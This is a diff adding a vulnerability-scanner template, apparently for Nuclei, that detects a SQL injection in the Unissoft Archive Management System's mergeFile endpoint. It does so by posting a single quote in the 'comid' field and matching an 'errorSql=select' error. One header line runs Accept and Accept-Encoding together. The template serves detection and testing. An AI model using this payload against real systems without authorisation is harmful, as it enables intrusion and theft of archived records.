@@ -1,0 +1,28 @@
+id: unissoft-archive-mergefile-sqli
+
+info:
+  name: Unissoft Archive Management System mergeFile - SQL Injection
+  author: qwtd
+  severity: high
+  description: Unissoft Archive Management System mergeFile contains a SQL injection vulnerability.
+  reference:
+    - https://wiki.wy876.cn/#/./%E7%B4%AB%E5%85%89%E7%94%B5%E5%AD%90%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FmergeFile%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
+  tags: 紫光档案管理系统
+
+http:
+  - raw:
+      - |
+        POST /Archive/ErecordManage/mergeFile HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */* Accept-Encoding: gzip, deflate
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        userID=admin&fondsid=1&comid='
+
+    matchers:
+      - type: word
+        words:
+          - "errorSql=select"
+
